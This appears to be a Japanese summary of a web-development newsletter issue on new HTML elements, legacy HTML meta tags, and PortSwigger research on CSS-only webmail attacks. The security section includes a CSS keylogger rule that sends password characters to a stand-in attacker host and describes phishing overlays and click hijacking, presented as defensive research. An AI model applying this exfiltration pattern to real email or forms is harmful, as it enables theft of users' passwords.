## 1. `<geolocation>` 要素（Chrome 144〜）

**出典**: [Introducing the `<geolocation>` HTML element | Chrome for Developers](https://developer.chrome.com/blog/geolocation-html-element) / [MDN](https://developer.mozilla.org/en-US/docs/Web/HTML/Reference/Elements/geolocation) / [Manuel Matuzović氏の解説](https://www.matuzo.at/blog/2026/geolocation-element)

### ①目的・問題意識
これまで位置情報の取得は `navigator.geolocation.getCurrentPosition()` のようなJavaScript APIをユーザー操作（ボタンクリックなど）のハンドラ内から呼び出す必要があり、
- 許可プロンプトがスクリプト実行のタイミングでいきなり表示される（ユーザーが文脈を理解しにくい）
- 一度拒否されると再度リクエストする导线をアプリ側で自前実装する必要がある
といった問題があった。`<geolocation>` はこれを宣言的なUI部品として提供し、「ユーザーの操作起点で位置情報を要求する」という体験を標準化する。

### ②具体的なコード
```html
<geolocation
  onlocation="handleLocation(event)"
  autolocate
  accuracymode="precise">
</geolocation>
```
```javascript
function handleLocation(event) {
  if (event.target.position) {
    const { latitude, longitude } = event.target.position.coords;
    console.log("Location retrieved:", latitude, longitude);
  } else if (event.target.error) {
    console.error("Error:", event.target.error.message);
  }
}
```
- `accuracymode` 属性: `"precise"`（高精度）または `"approximate"`（おおよその位置）を指定可能。
- `autolocate` 属性: 要素がDOMに挿入された時点で自動的に位置取得を試みる。
- `onlocation` イベント: 位置情報の取得結果（成功・失敗）が確定した際に発火し、`event.target.position`（成功時の座標）または `event.target.error`（失敗時のエラー）を参照する。

### ③効果的である理由
- ブラウザ側が許可UIとアイコン表示・状態管理（許可/拒否/保留）を一括で面倒を見るため、開発者側のボイラープレートJSコードが減る。
- スクリプト実行タイミングに依存しない「宣言的」な要素になったことで、ユーザーが位置情報を要求している理由をUI上のコンテキスト（要素の見た目や配置）から理解しやすくなり、不用意な許可・拒否を減らせる。
- Mozilla・WebKitもこの提案に肯定的な立場を示しており、将来的にcrossブラウザで標準化される可能性が高い。

## 2. `<usermedia>` 要素（Chrome 151〜）

**出典**: [Introducing the `<usermedia>` HTML element | Chrome for Developers](https://developer.chrome.com/blog/usermedia-html-element)

### ①目的・問題意識
カメラ・マイクへのアクセスは従来 `navigator.mediaDevices.getUserMedia()` をスクリプトから呼び出す方式のみで、
- 許可プロンプトの表示タイミングをアプリが完全にコントロールする必要がある
- 一度拒否された後の再許可導線（設定変更を促すUIなど）を自前で作り込む必要がある
という課題があった。`<usermedia>` はこれを `<geolocation>` と同様に宣言的な「Capability Element」として提供し、ブラウザ自身が許可プロンプトとカメラ/マイクへのアクセスフロー全体を管理する。

### ②具体的な技術詳細
- `<usermedia>` はカメラとマイクの両方（音声+映像）へのアクセスを要求する結合型の要素。
- 取得した `MediaStream` オブジェクトをアプリケーションに引き渡す。
- ロードマップ上では今後、映像のみを扱う `<camera>`、音声のみを扱う `<microphone>` という単機能版の要素も追加される予定（Capability Elementsファミリーとしての拡張）。

### ③なぜ効果的か
- ユーザーの「意図のキャプチャ」「ブラウザプロンプトの管理」「MediaStreamの受け渡し」という一連の流れをブラウザ自身が担うことで、アプリ側のボイラープレートコードを削減。
- 過去に許可を拒否したユーザーに対しても、ブラウザ標準のリカバリー導線（設定変更への誘導など）がシームレスに提供されるため、セキュリティとUXの両面で改善する。
- `<geolocation>` から始まった「スクリプトトリガー型の許可要求」から「宣言的・ユーザー起点の許可要求」へという設計思想の転換の一部であり、今後同様のパターンで他の権限（通知、クリップボード等）にも展開されていく可能性がある。

## 3. `<model>` 要素（3Dモデルのネイティブ埋め込み）

**出典**: [The Model Element - Immersive Web](https://immersiveweb.dev/model) / [immersive-web/model-element explainer (GitHub)](https://github.com/immersive-web/model-element/blob/main/explainer.md) / 提案者: Apple (Brandel Zachernuk, Laszlo Gombos)

### ①目的・問題意識
HTMLには `<img>`・`<picture>`・`<video>` のように画像や動画をネイティブに埋め込む要素は存在するが、3Dコンテンツを宣言的に埋め込む標準的な方法がなかった。従来は `<canvas>` 要素とWebGL/Three.jsなどのJavaScriptライブラリでレンダリングをスクリプト側から完全に組み立てる必要があり、実装コストが高かった。`<model>` は `<video>` が動画を扱うのと同じ感覚で3Dコンテンツをマークアップだけで扱えるようにする。

### ②具体的なコード
```html
<model>
  <source src="chair.glb" type="model/gltf-binary">
  <img src="chair-preview.jpg" alt="A red chair">
</model>
```
（比較参考として、既存の非標準ソリューションであるGoogleの `<model-viewer>` Webコンポーネントは次のように使う）
```html
<script type="module" src="https://unpkg.com/@google/model-viewer/dist/model-viewer.min.js"></script>
<model-viewer id="mv-shark" src="shark.glb" camera-controls></model-viewer>
```
- `<model>` は `<video>`/`<picture>` と同様に複数の `<source>` 要素で異なるフォーマット（例: glTFバイナリ）を指定でき、対応していないブラウザ向けのフォールバックコンテンツ（画像など）も内包できる。
- `HTMLModelElement` というDOM APIインターフェースが提供され、表示・アニメーション・インタラクション・フェッチ・UI付帯機能（カメラ操作UIなど）をJavaScriptから制御できる。

### ③なぜ効果的か
- ブラウザがレンダラーを内蔵することで、開発者は重量級の3DライブラリをJSとして読み込む必要がなくなり、パフォーマンス・アクセシビリティ面で有利になる。
- `<video>`のようにフォールバックコンテンツを宣言的に指定できるため、非対応ブラウザでも自然に劣化（画像表示など）させられる。
- immersive-webコミュニティグループ主導で標準化が進められており、AR/VR用途（3D製品プレビュー、ECサイトの商品ビューアなど）への応用が見込まれる。

## 4. HTML-in-Canvas（`drawElementImage()`）

**出典**: [Exploring the HTML-in-Canvas Proposal | Codrops](https://tympanus.net/codrops/2026/05/13/exploring-the-html-in-canvas-proposal/) / [WICG/html-in-canvas 仕様](https://wicg.github.io/html-in-canvas/) / [html-in-canvas.dev デモ集](https://html-in-canvas.dev/) / [Chrome Developers: origin trial告知](https://developer.chrome.com/blog/html-in-canvas-origin-trial)

### ①目的・問題意識
Canvas上に複雑なレイアウトのテキストやリッチコンテンツを描画するための標準APIがこれまで存在せず、開発者は文字を1文字ずつ手動でCanvasに描画する、あるいはスクリーンショットライブラリでDOM要素を画像化してから貼り付ける、といった非効率な手法に頼っていた。その結果、Canvasベースのコンテンツはアクセシビリティ・国際化（多言語レイアウト）・パフォーマンス・表示品質のいずれの面でも劣化しがちだった。HTML-in-Canvasは、実際のDOM要素（実CSSでレンダリングされたライブHTML）をそのままCanvasに描画できるようにすることでこれを解決する。

### ②具体的なコード
```javascript
const canvas = document.getElementById("source");
const content = document.getElementById("content");
const ctx = canvas.getContext("2d");

canvas.onpaint = () => {
  ctx.reset();
  ctx.drawElementImage(content, 0, 0);
};
canvas.requestPaint();
```
- `content` 属性（`<canvas content="drawable">` のように指定）でCanvasの子孫要素をレイアウト対象として扱うか（`drawable`）、従来通りフォールバックコンテンツとして扱うか（`fallback`、デフォルト）を切り替える。
- `drawElementImage()` は2D・WebGL・WebGPUのいずれのCanvasコンテキストにも実DOM要素を描画できる。
- 描画は `onpaint` イベントハンドラ内で行うのが基本パターンで、これは要素が再描画されるたびに発火する。インタラクティビティ（クリック等のヒットテスト）を維持し続けるには、要素側のCSS transformを `drawElementImage()` の戻り値で更新する必要がある。
- 現状はChromiumの `chrome://flags/#canvas-draw-element` フラグ有効化で試せる実験的機能（Origin Trialとしても提供）。

### ③なぜ効果的か
- 実際のブラウザレンダリングエンジンがテキストのシェーピング・折り返し・多言語対応を行うため、Canvas描画でもネイティブHTML同等の表示品質・国際化対応が得られる。
- DOM要素のヒットテスト（クリック判定等）が機能し続けるため、ゲームUIやリッチなキャンバスベースアプリでもアクセシビリティやインタラクションを損なわずに済む。
- プライバシー保護の観点から、クロスオリジンiframeなど機微な内容はCanvasへの描画対象から除外する制限が仕様に組み込まれており、セキュリティにも配慮されている。

## 5. `switch` 属性つきチェックボックス（ネイティブなトグルスイッチ、ダークモードトグルの例）

**出典**: [Switch Attribute (Explainer) | Open UI](https://open-ui.org/components/switch.attribute.explainer/) / [Switching It Up With HTML's Latest Control — Smashing Magazine](https://www.smashingmagazine.com/2024/05/switching-it-up-html-latest-control/)

### ①目的・問題意識
オン/オフの即時切り替えを表す「スイッチ」UIは、設定画面・機能フラグ・同意ダイアログ・ダークモード切替など極めて頻繁に使われるパターンであるにもかかわらず、HTMLにはネイティブな要素・属性が存在せず、開発者は毎回チェックボックスをCSSで自作スタイリングしてスイッチ風に見せかけていた（アクセシビリティ対応も各自で作り込む必要があった）。`switch` 属性は、フォーム送信を前提とする従来のチェックボックスの意味論とは異なる「即時反映されるオン/オフコントロール」というスイッチ本来の意味論をHTML標準の属性一つで実現する。

### ②具体的なコード
```html
<label>
  <input type="checkbox" switch>
  Dark mode
</label>
```
スタイルをカスタマイズする例（`appearance: none` を指定した上で疑似要素をスタイリング）:
```css
/* appearance: none を指定してからカスタムスタイルを当てる */
input[switch] {
  appearance: none;
  width: 56px;
  height: 28px;
}

/* トラック（背景の帯） */
input[switch]::slider-track {
  background: linear-gradient(135deg, #667eea, #764ba2);
}

/* つまみ（スライドするノブ） */
input[switch]::slider-thumb {
  background: linear-gradient(135deg, #f6d365, #fda085);
  box-shadow: 0 2px 6px rgba(0,0,0,0.3);
}
```
- `::slider-track`（トラック部分）、`::slider-thumb`（つまみ部分）という新しい疑似要素でスタイルを細かくカスタマイズできる。
- `accent-color` CSSプロパティでオン状態（Active）の色をブランドカラーに簡単に合わせられる。
- Safari 17.4+ で先行実装されており、`switch` 属性を付けるだけでチェックボックスの見た目がネイティブなスイッチUIに変わる。

### ③なぜ効果的か
- これまでJavaScriptとCSSを組み合わせて自作していたスイッチコンポーネントが、属性1つ・CSS疑似要素数行で実現できるようになり実装コストが激減する。
- ネイティブ要素であるためキーボード操作・スクリーンリーダー対応などアクセシビリティがブラウザ側で保証される。
- 「フォーム送信が前提のチェックボックス」と「即時反映のスイッチ」という意味論の違いをHTML自体が区別できるようになり、UIの意味づけとして正確になる。

## 6. 「HTML Relics」— 過去の遺物となったHTMLスニペット・meta要素たち

**出典**: [Antiquated HTML Snippets and Artefacts | Vale.Rocks](https://vale.rocks/posts/html-relics)（[Hacker Newsでの議論](https://news.ycombinator.com/item?id=49607991)、[OSNewsでの紹介](https://www.osnews.com/story/145927/antiquated-html-snippets-and-artefacts/)）

### ①目的・問題意識
ブラウザ戦争、サードパーティ製ツールバーとの統合、ベンダー独自拡張、プラットフォーム固有のハックなどの歴史的経緯から、Webサイトのソースコードに紛れ込んだ「今ではほぼ無意味だが動作に影響しうる」古いHTMLスニペット・meta要素をカタログ化し、それぞれが生まれた背景と現在の意味の有無を解説する記事。レガシーなコードベースを保守する開発者が「なぜこの謎のタグがあるのか」を理解する助けになる。

### ②具体的なコード・技術詳細（記事で扱われている代表的な遺物）
- **X-UA-Compatible**: Internet Explorerに、利用可能な最新のレンダリングエンジンを強制的に使わせるためのmetaタグ。
  ```html
  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
  ```
- **Conditional Comments（条件付きコメント）**: IE固有の条件分岐コメント構文。Netscapeにも独自の同種の仕組みがあり、JavaScriptエンティティをコメント直後に書くことで分岐させていた。
  ```html
  <!--[if IE]>
    <p>This is only shown in Internet Explorer.</p>
  <![endif]-->
  ```
  Netscape版（JSエンティティを利用した分岐コメント）:
  ```html
  <!--&{navigator.appName == 'Netscape'};
  <p>Only shown in Netscape.</p>
  -->
  ```
- **Skype Toolbarの無効化タグ**: 2000年代〜2010年代半ばに存在したSkype Toolbar（IE/Chrome/Firefoxアドオン）が、ページ上の電話番号らしき文字列を自動検出してアイコンを差し込みレイアウト崩れを起こしていたため、それを無効化するためのmetaタグ。
  ```html
  <meta name="skype_toolbar" content="skype_toolbar_parser_compatible">
  ```
- **PICS（Platform for Internet Content Selection）**: 1990年代半ばにW3Cが策定したコンテンツレーティング／フィルタリングのための仕組み。metaタグでページにレーティング情報を埋め込み、IE3以降やフィルタリング製品に組み込まれたが、2003年頃までにほぼ廃止された。
- その他、記事の目次にはICBM座標（位置情報meta）、Microsoft Smart Tags、Interpage Transitions（ページ遷移エフェクトmeta）、Image Toolbar（IEの画像に表示されるツールバーの無効化）なども挙げられている。

### ③なぜ知っておくと効果的か
- 古いコードベースの `<head>` に残る謎のmeta/コメントの由来を理解でき、「安全に削除できるか」を判断する材料になる。
- ブラウザベンダーやサードパーティの独自拡張が標準の隙間を埋めていた歴史を知ることで、現在の標準化プロセス（Open UIやWICGなど）がなぜ重要かという文脈理解が深まる。
- 特にX-UA-Compatibleや条件付きコメントは、レガシーなIEサポートが必要な社内システムなどでは今でも参照される可能性があり、意味を理解せず削除すると意図しない挙動変化を招くことがある。

## 7. CSS Bomb: Webmailを狙ったCSSだけの攻撃（PortSwigger / Black Hat USA 2026, Gareth Heyes氏の研究）

**出典**: [CSS: the bomb inside your inbox | PortSwigger Research](https://portswigger.net/research/css-the-bomb-inside-your-inbox) / [GitHub: PortSwigger/css-the-bomb-inside-your-inbox](https://github.com/portswigger/css-the-bomb-inside-your-inbox) / [The Hacker News](https://thehackernews.com/2026/08/new-css-attacks-can-break-webmail.html)

### ①目的・問題意識
Gmail・Outlook・Yahoo Mail・AOL Mail・Fastmail・ProtonMailなど主要Webメールクライアントは、受信メールのHTML/CSSを「安全な範囲」にサニタイズしてから表示している。しかしサニタイザーが「安全」とみなす範囲と、ブラウザが実際にレンダリングする際の挙動との間に食い違いがあり、そこを突くとJavaScriptを一切使わずCSSとHTMLだけで、なりすまし・UI改ざん・認証情報の窃取が可能になることを示した研究（本記事はセキュリティリスクとして "何が可能か" を解説する内容であり、防御側の学びとしての意味合いが強い）。

### ②具体的な技術詳細・攻撃手法
記事で紹介されている代表的な攻撃パターン:
- **CSS属性セレクタによるキーロガー（許可リスト化されたHTML/CSSの範囲内でも構築可能）**: 一般的なCSSキーロガーの原理は、`input[value^="a"]` のような属性セレクタで特定の文字が入力された状態にマッチさせ、そのルールが持つ `background-image: url(...)` を条件付きで発火させて外部サーバーへHTTPリクエストを送らせ、1文字ずつ値を外部に漏洩させるというもの。
  ```css
  input[type="password"][value^="a"] {
    background-image: url('https://attacker.example/log?c=a');
  }
  ```
  通常この手法は値の変化に応じてスタイル再計算が必要なため、Reactなど値をDOMに反映し続けるリアクティブなUIでのみ機能しやすいという制約があったが、本研究では `<select>` 要素やHTMLの `<label>` を乗っ取る手法を組み合わせることで、DOMPurifyのような厳格なサニタイザーで保護されたメール内でも、実質的にリアルタイムで動作するパスワード窃取の仕組みを構築できることを示した。
- **Outlookでの画面乗っ取り（CSS gadgetバグ）**: CSSの「ガジェット」的な不具合を利用してメール表示ウィンドウの境界を突破し、正規のMicrosoftログイン画面そっくりの偽画面を表示できることを実証。
- **Fastmailでの「CSS hotwiring」**: ページ上の任意のクリックを乗っ取り、意図しないアクションを発火させる手法。また別の不具合では、メールが開封されたかどうかをJavaScriptなしで密かに追跡することも可能だった。
- **画像プロキシのバイパス**: 多くのWebメールは画像リクエストを自社の画像プロキシ経由に強制することで送信元IPの露出などを防いでいるが、Outlookにはそもそも画像プロキシが存在しないなど、実装の不備によりこの防御が機能しないケースがあった。

### ③なぜ効果的か（＝防御側にとって注意すべき理由）
- 攻撃がCSS/HTMLのみで完結するため、JavaScriptベースの脅威を検出することに主眼を置いたアンチウイルス・スパムフィルター・スクリプトブロッカーの検知網をすり抜けやすい。
- `<select>`や`<label>`など、一見スタイリングにしか関係なさそうなHTML要素・CSS機能がインタラクティブな挙動（クリックの乗っ取りなど）を持つことを利用しており、サニタイザーの「危険なタグ・属性を除去する」という発想だけでは防ぎきれない。
- 対策として本研究は、受信メールのHTMLを厳格にサンドボックス化されたiframe内で表示し、CSS・カスタム属性・`<select>`メニュー・画像リクエストを厳しく制限することを推奨している。

## まとめ

Issue #757は「What's new in HTML for 2026」というテーマのもと、
1. ブラウザネイティブな宣言的コントロール（`<geolocation>`、`<usermedia>`、`switch`属性）による許可要求・UI部品の標準化
2. リッチコンテンツをマークアップに統合する新要素・API（`<model>`、HTML-in-Canvas）
3. HTMLの歴史的な遺物を振り返る記事（HTML Relics）
4. CSSだけで成立するセキュリティ上の攻撃手法の研究（CSS Bomb）

という4つの軸で構成されており、「JavaScriptに頼らずマークアップ・CSSで完結する機能」がポジティブ（新要素・新属性）とネガティブ（CSSのみで実行可能な攻撃）の両面で強調されている号だった。
